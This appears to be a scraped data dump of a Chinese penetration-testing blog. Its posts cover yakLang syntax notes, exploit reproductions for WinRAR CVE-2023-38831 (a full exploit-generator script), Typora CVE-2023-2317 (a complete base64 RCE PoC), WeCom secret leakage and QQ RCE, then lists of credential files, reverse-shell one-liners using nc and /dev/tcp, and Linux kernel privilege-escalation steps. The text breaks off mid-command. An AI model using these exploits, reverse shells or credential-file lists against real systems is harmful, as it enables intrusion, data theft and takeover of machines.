以字符串作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串 Trim(cutstr…) 删除字符串头尾的空格和cutstr TrimLeft(cutstr…) 删除字符串头部的cutstr TrimRight(cutstr…) 删除字符串尾部的cutstr HasPrefix(substr) &#x2F; StartsWith(substr) 检查字符串是否是以指定子字符串 substr 开头 HasSuffix(substr) &#x2F; EndsWith(substr) 检查字符串是否是以指定子字符串 substr 结尾 Zfill(width) 返回长度为 width 的字符串，原字符串右对齐，前面填充0 Rzfill(width) 返回长度为 width 的字符串，原字符串左对齐，后面填充0 Ljust(width) 返回一个原字符串左对齐,并使用空格填充至长度 width 的新字符串 Rjust(width) 返回一个原字符串右对齐,并使用空格填充至长度 width 的新字符串 Count(n) 返回 str 在 string 里面出现的次数 Find(substr) &#x2F; IndexOf(substr) 检测 str 是否包含在字符串中，并返回开始的索引值，如没找到则返回-1 Rfind(substr) &#x2F; LastIndexOf(substr) 类似于 find()函数，不过是从右边开始查找 Lower() 转换字符串中所有大写字符为小写 Upper() 转换字符串中的小写字母为大写 Title() 返回”标题化”的字符串,就是说所有单词都是以大写开始，其余字母均为小写 IsLower() 判断字符串是否全为小写，如果是则返回 True，否则返回 False IsUpwer() 判断字符串是否全为大写，如果是则返回 True，否则返回 False IsTitle() 如果字符串是标题化的则返回 True，否则返回 False IsAlpha() 如果字符串所有字符都是字母则返回 True, 否则返回 False IsDigit() 如果字符串所有字符都是数字则返回 True, 否则返回 False IsAlnum() 如果字符串所有字符都是字母和数字则返回 True, 否则返回 False IsPrintable() 如果字符串所有字符都是可见字符则返回 True, 否则返回 False 整数浮点数运算： 1234println(2 + 2) // 4println(50 - 5*6) // 20println(8 / 5) // 1println(17 % 3) // 2 多进制整数声明 12345678// 二进制声明a = 0b10 // 2// 八进制声明b = 0100 // 64// 普通整数声明（十进制）c = 100 // 100// 十六进制声明d = 0x10 // 16 浮点数声明 12a = 1.5 // 1.5b = a / 0.5 // 3.0 列表类型：创建与声明 1234567891011121314a = [1, 2, 3]println(typeof(a)) // []intb = [&quot;qwe&quot;, &quot;asd&quot;]println(typeof(b)) // []stringc = [1, 2, &quot;3&quot;]println(typeof(c)) // []any&#123;&#125;// 创建一个不带长度的 []inta = make([]int)println(typeof(a)) // []int// 创建一个带长度的 []intb = make([]int, 2)println(len(b)) // 2 方法名 描述 Append(elem…) &#x2F; Push(elem…) 在列表末尾追加新的elem元素 Pop(n…) 弹出数组&#x2F;切片的第n个元素,默认为最后一个 Insert(n, elem) 在指定位置n插入elem元素 Extend(arr) &#x2F; Merge(arr) 用一个新的列表扩展原列表 Length() &#x2F; Len() 返回列表的长度 Capability() &#x2F; Cap() 返回列表的容量 StringSlice() 将列表转换成[]string类型 GeneralSlice() 将列表转换成[]var类型(即[]interface{}) Shift() 从数据开头移除一个元素，相当于Pop(0) Unshift(elem) 从数据开头插入一个elem元素，相当于Insert(0, elem) Map(func (elem)elem) 会根据提供的函数对列表中的每一个函数做映射，返回映射后的列表 Filter(func (elem)bool) 会根据提供的函数对列表中的每一个函数做过滤（该函数返回true&#x2F;false，将返回false的元素筛除），返回过滤后的列表 Remove(elem) 删除在列表中第一次出现的elem元素 Reverse() 翻转列表 Sort(reverse…) 排序列表，默认为升序，若设置reverse&#x3D;true，则改为降序 Clear() 清空列表 Count(elem) 统计elem元素在列表中出现的次数 Index(n) 返回列表中第n个元素，n支持负数表示倒数第n个元素","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.ixxzhi.cn/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"yakLang","slug":"yakLang","permalink":"https://www.ixxzhi.cn/tags/yakLang/"}]},{"title":"winrar_RCE(CVE-2023-38831)漏洞复现","slug":"winrar-RCE-cve-2023-38831-漏洞复现","date":"2023-09-01T12:49:43.000Z","updated":"2023-09-01T13:47:28.053Z","comments":true,"path":"2023/09/01/winrar-RCE-cve-2023-38831-漏洞复现/","link":"","permalink":"https://www.ixxzhi.cn/2023/09/01/winrar-RCE-cve-2023-38831-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"漏洞详情 漏洞名称：WinRAR远程代码执行漏洞 漏洞编号：CVE-2023-38831 漏洞原理：WinRAR 在处理压缩包内同名的文件与文件夹时存在代码执行漏洞。攻击者构建由恶意文件与非恶意文件构成的特制压缩包文件，诱导受害者打开此文件中看似无害的文件（如txt文件）后，将在受害者机器上执行任意代码。","text":"漏洞详情 漏洞名称：WinRAR远程代码执行漏洞 漏洞编号：CVE-2023-38831 漏洞原理：WinRAR 在处理压缩包内同名的文件与文件夹时存在代码执行漏洞。攻击者构建由恶意文件与非恶意文件构成的特制压缩包文件，诱导受害者打开此文件中看似无害的文件（如txt文件）后，将在受害者机器上执行任意代码。 漏洞复现 在一个空文件夹下新建如下两个文件夹 test.txt(文件夹) doc(文件夹) 在doc文件夹下新建一个test.txt文件 在test.txt文件夹下新建一个test.txt.bat文件并写入利用代码 压缩test.txt文件夹并重命名为test.rar 用winRAR打开test.rar 把doc文件夹下的test.txt文件拖进test.rar 重命名test.txt文件为”test.txt “(结尾加了个空格) 重命名test.txt文件夹下的test.txt.bat为test.txt .bat 双击”test.txt “文件，成功弹出计算器 利用代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#!/usr/bin/env python3# -*- coding: utf-8 -*-import shutilimport osimport sysTEMPLATE_NAME = &quot;TEMPLATE&quot;OUTPUT_NAME = &quot;CVE-2023-38831-poc.rar&quot;BAIT_NAME = &quot;test.txt&quot;SCRIPT_NAME = &quot;test.bat&quot;def main(): global BAIT_NAME, SCRIPT_NAME, OUTPUT_NAME # 声明为全局变量 # 处理命令行参数 if len(sys.argv) &gt; 3: BAIT_NAME = os.path.basename(sys.argv[1]) SCRIPT_NAME = os.path.basename(sys.argv[2]) OUTPUT_NAME = os.path.basename(sys.argv[3]) elif len(sys.argv) == 2 and sys.argv[1] == &quot;poc&quot;: pass else: print(&quot;&quot;&quot;用法： python cve-2023-38831-exp-gen.py poc python cve-2023-38831-exp-gen.py &lt;BAIT_NAME&gt; &lt;SCRIPT_NAME&gt; &lt;OUTPUT_NAME&gt;&quot;&quot;&quot;) sys.exit() # 提取鱼叉文件名的扩展名 BAIT_EXT = b&quot;.&quot; + bytes(BAIT_NAME.split(&quot;.&quot;)[-1], &quot;utf-8&quot;) print(&quot;鱼叉文件名:&quot;, BAIT_NAME) print(&quot;脚本文件名:&quot;, SCRIPT_NAME) print(&quot;输出文件名:&quot;, OUTPUT_NAME) # 清理并创建必要的目录 if os.path.exists(TEMPLATE_NAME): shutil.rmtree(TEMPLATE_NAME) os.mkdir(TEMPLATE_NAME) d = os.path.join(TEMPLATE_NAME, BAIT_NAME + &quot;A&quot;) if not os.path.exists(d): os.mkdir(d) # 复制文件到模板目录 shutil.copyfile(SCRIPT_NAME, os.path.join(d, BAIT_NAME + &quot;A.cmd&quot;)) shutil.copyfile(BAIT_NAME, os.path.join(TEMPLATE_NAME, BAIT_NAME + &quot;B&quot;)) # 创建模板目录的 zip 压缩文件 shutil.make_archive(TEMPLATE_NAME, &#x27;zip&#x27;, TEMPLATE_NAME) # 读取、修改并写回 zip 压缩文件 with open(TEMPLATE_NAME + &quot;.zip&quot;, &quot;rb&quot;) as f: content = f.read() content = content.replace(BAIT_EXT + b&quot;A&quot;, BAIT_EXT + b&quot; &quot;) content = content.replace(BAIT_EXT + b&quot;B&quot;, BAIT_EXT + b&quot; &quot;) os.remove(TEMPLATE_NAME + &quot;.zip&quot;) # 将修改后的内容保存为最终输出文件 with open(OUTPUT_NAME, &quot;wb&quot;) as f: f.write(content) print(&quot;成功生成漏洞利用代码。&quot;)if __name__ == &quot;__main__&quot;: main()","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"RCE","slug":"RCE","permalink":"https://www.ixxzhi.cn/tags/RCE/"},{"name":"WinRAR","slug":"WinRAR","permalink":"https://www.ixxzhi.cn/tags/WinRAR/"}]},{"title":"2023企业微信0Day漏洞复现","slug":"2023企业微信0Day漏洞复现","date":"2023-08-31T09:06:08.000Z","updated":"2023-09-01T15:04:21.576Z","comments":true,"path":"2023/08/31/2023企业微信0Day漏洞复现/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/31/2023%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A10Day%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"漏洞概述 漏洞编号：无 漏洞信息：企业微信0day漏洞可以在&#x2F;cgi-bin&#x2F;gateway&#x2F;agentinfo接口未授权情况下可直接获取企业微信secret等敏感信息，可导致企业微信全量数据被获取。 漏洞危害： 可导致企业微信全量数据被获取 存在使用企业微信轻应用对内发送钓鱼文件和链接等风险 影响版本：2.5.x、2.6.93000以下 漏洞复现 FOFA语法：app&#x3D;”Tencent-企业微信”","text":"漏洞概述 漏洞编号：无 漏洞信息：企业微信0day漏洞可以在&#x2F;cgi-bin&#x2F;gateway&#x2F;agentinfo接口未授权情况下可直接获取企业微信secret等敏感信息，可导致企业微信全量数据被获取。 漏洞危害： 可导致企业微信全量数据被获取 存在使用企业微信轻应用对内发送钓鱼文件和链接等风险 影响版本：2.5.x、2.6.93000以下 漏洞复现 FOFA语法：app&#x3D;”Tencent-企业微信” 获取id和secret 1https://xx.xx.xx.xx:xx/cgi-bin/gateway/agentinfo 获取Access_token 1https://xx.xx.xx.xx:xx/cgi-bin/gettoken?corpid=xxxxxxx&amp;corpsecret=x-xxxxxxxx 调用接口 https://developer.work.weixin.qq.com/document/path/90196","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"企业微信","slug":"企业微信","permalink":"https://www.ixxzhi.cn/tags/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1/"}]},{"title":"Typora_RCE漏洞(CVE-2023-2317)","slug":"Typora-RCE漏洞-CVE-2023-2317","date":"2023-08-31T07:44:30.000Z","updated":"2023-09-14T06:31:32.194Z","comments":true,"path":"2023/08/31/Typora-RCE漏洞-CVE-2023-2317/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/31/Typora-RCE%E6%BC%8F%E6%B4%9E-CVE-2023-2317/","excerpt":"漏洞详情 漏洞名称：Typora远程代码执行漏洞 漏洞编号：CVE-2023-2317 漏洞原理：Windows和Linux版本1.6.7之前的Typora中的updater&#x2F;updater.html中存在基于DOM型的XSS漏洞，该漏洞允许通过加载特制的markdown文件从而使得执行任意Javascript代码。如果用户打开恶意markdown文件或者从恶意网站复制文本并将其粘贴到Typora，通过在&lt;embed&gt;标签中引用updater.html，则可以利用此漏洞，此外，攻击者可以使用特权接口reqnode访问节点模块child_process并执行任意系统命令。","text":"漏洞详情 漏洞名称：Typora远程代码执行漏洞 漏洞编号：CVE-2023-2317 漏洞原理：Windows和Linux版本1.6.7之前的Typora中的updater&#x2F;updater.html中存在基于DOM型的XSS漏洞，该漏洞允许通过加载特制的markdown文件从而使得执行任意Javascript代码。如果用户打开恶意markdown文件或者从恶意网站复制文本并将其粘贴到Typora，通过在&lt;embed&gt;标签中引用updater.html，则可以利用此漏洞，此外，攻击者可以使用特权接口reqnode访问节点模块child_process并执行任意系统命令。 漏洞复现 弹计算器 123456# Payloadreqnode(&#x27;child_process&#x27;).exec((&#123;Win32: &#x27;calc&#x27;, Linux: &#x27;gnome-calculator&#x27;&#125;)[navigator.platform.substr(0,5)])# 经过Base64编码后获得cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3InfSlbbmF2aWdhdG9yLnBsYXRmb3JtLnN1YnN0cigwLDUpXSk=# 完整的PoC&lt;embed style=&quot;height:0;&quot; src=&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3InfSlbbmF2aWdhdG9yLnBsYXRmb3JtLnN1YnN0cigwLDUpXSk=&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;&gt; 新建一个markdown文件把上述完整的PoC粘贴进去 Typora自动识别为HTML文件并弹出计算器","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"RCE","slug":"RCE","permalink":"https://www.ixxzhi.cn/tags/RCE/"},{"name":"Typora","slug":"Typora","permalink":"https://www.ixxzhi.cn/tags/Typora/"}]},{"title":"QQ客户端RCE漏洞复现","slug":"QQ客户端RCE漏洞复现","date":"2023-08-31T06:36:39.000Z","updated":"2023-09-19T02:44:23.998Z","comments":true,"path":"2023/08/31/QQ客户端RCE漏洞复现/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/31/QQ%E5%AE%A2%E6%88%B7%E7%AB%AFRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"漏洞详情 漏洞名称：QQ客户端远程代码执行漏洞 威胁程度：该漏洞给为逻辑漏洞，利用QQ客户端的逻辑缺陷进行攻击，被攻击方在点击消息内容时，不会弹窗提醒，自动下载并执行，在攻击者利用层面，可降低攻击者钓鱼等攻击手段的难度。 处置建议： 提示用户谨慎点击消息链接。 升级或安装终端安全软件，用于检测下载的文件是否异常。 影响范围：QQ Windows版9.7.13及以前版本","text":"漏洞详情 漏洞名称：QQ客户端远程代码执行漏洞 威胁程度：该漏洞给为逻辑漏洞，利用QQ客户端的逻辑缺陷进行攻击，被攻击方在点击消息内容时，不会弹窗提醒，自动下载并执行，在攻击者利用层面，可降低攻击者钓鱼等攻击手段的难度。 处置建议： 提示用户谨慎点击消息链接。 升级或安装终端安全软件，用于检测下载的文件是否异常。 影响范围：QQ Windows版9.7.13及以前版本 漏洞复现 准备一个可执行文件或批处理文件，例如calc.bat 在聊天窗口中发送calc.bat文件给测试账号 回复任何内容给该消息 转发回复的内容给目标 目标点击该消息即可自动下载并执行，中间无任何提示","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"QQ","slug":"QQ","permalink":"https://www.ixxzhi.cn/tags/QQ/"},{"name":"RCE","slug":"RCE","permalink":"https://www.ixxzhi.cn/tags/RCE/"}]},{"title":"常见敏感文件","slug":"常见敏感文件","date":"2023-08-22T15:37:59.000Z","updated":"2024-02-27T18:33:40.501Z","comments":true,"path":"2023/08/22/常见敏感文件/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/22/%E5%B8%B8%E8%A7%81%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/","excerpt":"Windows 系统文件 路径 信息 C:&#x2F;Windows&#x2F;PFRO.log windows用户名 C:&#x2F;Windows&#x2F;system.ini C:&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts C:&#x2F;boot.ini 查看系统版本 C:&#x2F;Windows&#x2F;repair&#x2F;sam 存储系统初次安装的密码","text":"Windows 系统文件 路径 信息 C:&#x2F;Windows&#x2F;PFRO.log windows用户名 C:&#x2F;Windows&#x2F;system.ini C:&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts C:&#x2F;boot.ini 查看系统版本 C:&#x2F;Windows&#x2F;repair&#x2F;sam 存储系统初次安装的密码 常用软件数据文件 路径 信息 C:&#x2F;Users&#x2F;用户名&#x2F;Documents&#x2F;WeChat Files&#x2F;All Users&#x2F;config&#x2F;config.data wxid C:&#x2F;Users&#x2F;用户名&#x2F;Documents&#x2F;WeChat Files&#x2F;wx_id&#x2F;config&#x2F;AccInfo.dat 微信号、手机号 C:&#x2F;Users&#x2F;用户名&#x2F;AppData&#x2F;Local&#x2F;Google&#x2F;Chrome&#x2F;User Data&#x2F;Default&#x2F;Login Data chrome的login data，虽然无法解密出密码，但是还是可以获取到对方的一些账号的 C:&#x2F;Users&#x2F;用户名&#x2F;AppData&#x2F;Local&#x2F;Google&#x2F;Chrome&#x2F;User Data&#x2F;Default&#x2F;History chrome的历史记录 C:&#x2F;Program Files&#x2F;mysql&#x2F;my.ini Mysql配置 C:&#x2F;Program Files&#x2F;mysql&#x2F;data&#x2F;mysql&#x2F;user.MYD Mysql root C:&#x2F;Windows&#x2F;php.ini php配置 C:&#x2F;Windows&#x2F;my.ini Mysql配置信息 C:&#x2F;Windows&#x2F;System32&#x2F;inetsrv&#x2F;MetaBase.xml IIS配置文件 Linux 路径 信息 &#x2F;root&#x2F;.ssh&#x2F;authorized_keys 如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去 &#x2F;root&#x2F;.ssh&#x2F;id_rsa ssh私钥,ssh公钥是id_rsa.pub &#x2F;root&#x2F;.ssh&#x2F;id_ras.keystore 记录每个访问计算机用户的公钥 &#x2F;root&#x2F;.ssh&#x2F;known_hosts ssh会把每个访问过计算机的公钥(public key)都记录在~&#x2F;.ssh&#x2F;known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。 &#x2F;etc&#x2F;passwd 账户信息 &#x2F;etc&#x2F;shadow 账户密码文件 &#x2F;etc&#x2F;my.cnf mysql 配置文件 &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf Apache配置文件 &#x2F;etc&#x2F;redhat-release 系统版本 &#x2F;root&#x2F;.bash_history 用户历史命令记录文件 &#x2F;root&#x2F;.mysql_history mysql历史命令记录文件 &#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db 全文件路径 &#x2F;proc&#x2F;mounts 记录系统挂载设备 &#x2F;porc&#x2F;config.gz 内核配置文件 &#x2F;proc&#x2F;sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid &#x2F;proc&#x2F;pid&#x2F;cmdline 则可以看到对应pid进程的完整命令行。 &#x2F;proc&#x2F;net&#x2F;fib_trie 内网IP &#x2F;proc&#x2F;self&#x2F;environ 环境变量 &#x2F;proc&#x2F;self&#x2F;loginuid 当前用户 &#x2F;porc&#x2F;self&#x2F;cmdline 当前进程的cmdline参数","categories":[{"name":"收集汇总","slug":"收集汇总","permalink":"https://www.ixxzhi.cn/categories/%E6%94%B6%E9%9B%86%E6%B1%87%E6%80%BB/"}],"tags":[{"name":"常用工具","slug":"常用工具","permalink":"https://www.ixxzhi.cn/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"}]},{"title":"信息收集","slug":"信息收集","date":"2023-08-20T00:04:03.000Z","updated":"2023-08-22T16:24:03.136Z","comments":true,"path":"2023/08/20/信息收集/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"Web资产信息收集 web基本架构： 开发语言：asp，aspx，php，java，jsp，python，ruby，go等. . . 程序源码：根据开发语言分类，应用分类，开源CMS分类，开发框架分类. . . 数据库类型：Access，Mysql，Mssql，Oracle，DB2，Redis，. . . 中间件容器：IIS，Apache，Nginx，Tomcat，Weblogic，Jboss，glasshfish. . . 服务器操作系统：Windows，Linux，Mac. . . 第三方软件：phpadmin，vs-ftpd，VNC，Openssh，ELK . . .","text":"Web资产信息收集 web基本架构： 开发语言：asp，aspx，php，java，jsp，python，ruby，go等. . . 程序源码：根据开发语言分类，应用分类，开源CMS分类，开发框架分类. . . 数据库类型：Access，Mysql，Mssql，Oracle，DB2，Redis，. . . 中间件容器：IIS，Apache，Nginx，Tomcat，Weblogic，Jboss，glasshfish. . . 服务器操作系统：Windows，Linux，Mac. . . 第三方软件：phpadmin，vs-ftpd，VNC，Openssh，ELK . . . 收集方法： 通过header头部信息收集 通过目录收集 通过端口收集 通过CMS收集 通过第三方搜索引擎收集 子域名信息收集 1⼦域名也是⼆级域名，是指顶级域名的域名。假设⽬标⽹络规模⽐较⼤，直接从主域名⼊⼿很难， 因为⼀般主域名是重点防护区域，所以可以从⼦域名⼊⼿，然后在想办法迂回接近真正的⽬标。 收集方法： 第三方搜索引擎 google hacking语法 在线子域名爆破：https://phpinfo.me/domain/ layer子域名挖掘机，OneForAll工具 旁站和C段信息收集 1旁站往往存在业务功能站点，建议先收集已有IP的旁站，再探测C段，确认C段⽬标后，再在C 段的基础上再收集⼀次旁站。 收集方法： 旁站在线查询：https://www.webscan.cc/ C段在线查询：https://c.webscan.cc/ FOFA：https://fofa.info/ 目录和敏感文件扫描 1在渗透测试中，探测web⽬录结构和隐藏的敏感⽂件是⼀个必不可少的环节，从中可以获取⽹ 站的后台管理⻚⾯、⽂件上传⻚⾯、甚⾄可以扫描出⽹站的源代码。 工具： 7kbscan dirsearch dirmap dirb 常见收集的文件： robots.txt、后台⽬录、⽹站安装包、⽹站上传⽬录、mysql管理⻚⾯、phpinfo、⽹站⽂本编辑 器、测试⽂件、⽹站备份⽂件(.rar、zip、7z、tar.gz、.bak)、DS_Store⽂件、vim编辑器备份 ⽂件(.swp)、.git、.svn等 CMS识别 1CMS(Content Management System)⼜称整站系统或⽂章系统。在2004年以前，如果想要进⾏⽹站内容管理，基本上都靠⼿⼯维护，但在信息爆炸的时代，完全靠⼈维护相当困难。所以就出现了CMS，开放者只要给客户⼀个软件包，客户⾃⼰安装配置好，就可以定期更新数据来维护⽹站，节省了⼤量的⼈⼒和物⼒。 工具： whatweb 御剑cms识别 判断网站中间件等信息 通过headers头部来判断 一些在线网站识别：http://whatweb.bugscaner.com/look/ 插件识别：Wappalyzer 端口扫描 1确定了⽬标⼤概的ip段后，可以先对ip的开放端⼝进⾏探测，⼀些特定服务可能开起在默认端⼝上，探测开放端⼝有利于快速收集⽬标资产，找到⽬标⽹站的其他功能站点。 工具： 御剑 Nmap 📌注意常见端口对应服务见附件 CDN绕过 1CDN就是内容发布⽹站，主要解决因传输距离和不同运营商节点造成的⽹络速度性能低下的问题。说的简单点，就是⼀组在不同运营商之间的对接点上的告诉缓存服务器，把⽤户经常访问的静态数据资源（html,css,js图⽚，视频，声⾳等⽂）直接缓存到节点服务器上，当⽤户再次请求时，会直接发到离⽤户最近的节点服务器响应给⽤户，当⽤户⼜实际数据交互时才会从远程web服务器上响应，这样可以⼤⼤提⾼⽹站的响应速度及⽤户体验。 判断是否存在CDN： ping测试 nsloogup 绕过CDN的方法： 查询子域 国外ip访问 历史解析记录 查询邮件ip 通过小程序，App 接口查询：https://get-site-ip.com/ 搜索faction.ico图标 一些敏感文件：文件探针、phpinfo、网站源代码、信息泄露等 信息泄露收集 Github搜索 1尝试在GitHub上寻找相关的敏感信息，如数据库连接信息，邮箱密码，uc-key，阿⾥的osskey，有时还可以找到源代码泄露。 in:name password 搜索标题中含有关键字password in:descripton password 搜索描述中含有关键字password in:readme password ⽂件搜索含有关键字 搜索一些账号密码： https://github.com/search?q=bilibili.com+password+3306&amp;type=code google hacking 语法收集信息 一些网盘搜索 凌云搜索 https://www.lingfengyun.com/ 盘搜搜：http://www.pansoso.com/ 盘搜：http://www.pansou.com/ ⽹站注册信息：www.reg007.com Js敏感信息泄露 https://github.com/Threezh1/JSFinder https://github.com/GerbenJavado/LinkFinder https://github.com/rtcatc/Packer-Fuzzer (webpack) https://github.com/momosecurity/FindSomething 一些敏感文件泄露 git信息泄露：访问xxx&#x2F;.git ⽂件 403或存在即可尝试获取源码 inurl:&#x2F;.git https://github.com/BugScanTeam/GitHack svn信息泄露：访问xxx&#x2F;.svn&#x2F;entries 内容存在即可尝试获取源码 inurl:&#x2F;.svn&#x2F;entries https://github.com/callmefeifei/SvnHack https://blog.csdn.net/wuxinweii/article/details/123099063 DS_Store泄露: 该⽂件为mac下的数据⽂件，访问存在即可尝试获取源码 inurl:&#x2F;.DS_Store https://github.com/lijiejie/ds_store_exp php特性配置说明⽂件composer.json泄露: 访问composer.json存在即可尝试获取源码相关信息 inurl:&#x2F;composer.json APP抓包，小程序信息收集 工具： 安卓模拟器 Charlies Proxifier Burp Suite Fiddler 使用一些开源工具进行信息收集 工具： 鹰图：https://hunter.qianxin.com/ Quake：https://quake.360.net/quake/#/index Fofa：https://fofa.info/ Zoomeye：https://www.zoomeye.org/ 水泽：https://github.com/0x727/ShuiZe_0x727 灯塔：https://github.com/TophantTechnology/ARL","categories":[{"name":"信息收集","slug":"信息收集","permalink":"https://www.ixxzhi.cn/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"工具","slug":"工具","permalink":"https://www.ixxzhi.cn/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"常用工具/网站","slug":"常用工具-网站","date":"2023-08-19T16:32:07.000Z","updated":"2024-02-27T18:34:05.966Z","comments":true,"path":"2023/08/20/常用工具-网站/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/20/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7-%E7%BD%91%E7%AB%99/","excerpt":"常用语参考：https://www.cnblogs.com/sunny11/p/13583083.html 操作系统命令：https://wangchujiang.com/linux-command/ 常用反弹shell命令：https://forum.ywhack.com/shell.php","text":"常用语参考：https://www.cnblogs.com/sunny11/p/13583083.html 操作系统命令：https://wangchujiang.com/linux-command/ 常用反弹shell命令：https://forum.ywhack.com/shell.php 1234nc -lvvp 2333（监听）nc -e cmd 192.168.1.2 2333nc -e /bin/bash 192.168.1.2 2333bash -i &amp;&gt; /dev/tcp/192.168.1.2/2333 0&amp;&gt;1 抓包工具： Burp Suite：http://ixxzhi.cn/d/tools/burpsuite_pro_v2023.3.zip?sign=O2iSiRMnL7t9Au2KoPBtNnvAjTcA_MCmOjwHpq5kHNY=:0 Charlies：http://ixxzhi.cn/d/tools/charles-proxy-4.6.3-win64.msi?sign=Y6c342qd0Vga3augKrJE3FdhuEHgd7G-96ICYaPK9KQ=:0 Fiddler：http://ixxzhi.cn/d/tools/Fiddler5%E6%B1%89%E5%8C%96%E4%B8%AD%E6%96%87%E7%89%88.zip?sign=11jZMJln-IUY-ihVxFv8zJ2B0zc62qqrtXXDCpbE5wI=:0 Proxifier：http://ixxzhi.cn/d/tools/Proxifier.zip?sign=PTOnT00ZbPc60_OTqzsXdzxeUUFkJ16O0FsuUNUGfHU=:0 信息收集： 综合 鹰图：https://hunter.qianxin.com/ Quake：https://quake.360.net/quake/#/index Fofa：https://fofa.info/ Zoomeye：https://www.zoomeye.org/ 水泽：https://github.com/0x727/ShuiZe_0x727 灯塔：https://github.com/TophantTechnology/ARL 子域收集 OneForAll：https://github.com/shmilylty/OneForAll Layer子域名挖掘机：https://github.com/euphrat1ca/LayerDomainFinder 目录扫描 7kbscan：https://github.com/7kbstorm/7kbscan-WebPathBrute dirsearch：https://github.com/maurosoria/dirsearch dirmap：https://github.com/H4ckForJob/dirmap dirb：kali自带 御剑：https://github.com/foryujian/yjdirscan CMS识别 whatweb 端口扫描 御剑 Nmap 常见端口：https://www.bilibili.com/read/cv24871379/?jump_opus=1 浏览器插件 hackbar：http://ixxzhi.cn/d/tools/hackbar-2.2.9-fx.xpi?sign=VuhRgtm8z5X_dGPCktU0bx57moQ1c16TNOvitQrRzvI=:0（发送请求） Wappalyzer：https://www.wappalyzer.com/ （资产收集，中间件开发语言等的识别） Cookie-Editor：https://cookie-editor.cgagnier.ca/（支持导入导出Cookie） FoxyProxy：https://getfoxyproxy.org（浏览器代理） FindSomething：https://github.com/ResidualLaugh/FindSomething/tree/firefox（从js找到一些有趣的东西）","categories":[{"name":"收集汇总","slug":"收集汇总","permalink":"https://www.ixxzhi.cn/categories/%E6%94%B6%E9%9B%86%E6%B1%87%E6%80%BB/"}],"tags":[{"name":"常用工具","slug":"常用工具","permalink":"https://www.ixxzhi.cn/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"}]},{"title":"Linux提权","slug":"Linux提权","date":"2023-08-19T16:30:33.000Z","updated":"2023-08-22T16:12:44.861Z","comments":true,"path":"2023/08/20/Linux提权/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/20/Linux%E6%8F%90%E6%9D%83/","excerpt":"信息收集 手动收集信息 查看操作系统版本","text":"信息收集 手动收集信息 查看操作系统版本 1234cat /etc/issuecat /etc/*-releasecat /etc/lsb-releasecat /etc/redhat-release 查看内核版本 123456cat /proc/versionuname -auname -mrsrpm -q kerneldmesg | grep Linuxls /boot | grep vmlinuz 工具收集信息 信息收集 https://github.com/rebootuser/LinEnum 提权exp收集 https://github.com/mzet-/linux-exploit-suggester https://github.com/jondonas/linux-exploit-suggester-2 1wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh 本地内核提权 查看版本信息 1uname -a 扫描当前版本是否有漏洞 1searchsploit linux 4.10.0-19 查看exp信息 123searchsploit -x linux/local/45010.c#查看exp利用方法https://www.exploit-db.com/exploits/45010 使用该CVE提权 1234#复制文件到当前目录cp /usr/share/exploitdb/exploits/linux/local/45010.c .#当前目录下启动web服务python -m http.server 80 靶机wget下载该文件 1wget 172.168.20.105:80/45010.c -O bt.c 编译运行，提权 123gcc bt.c -o btchmod 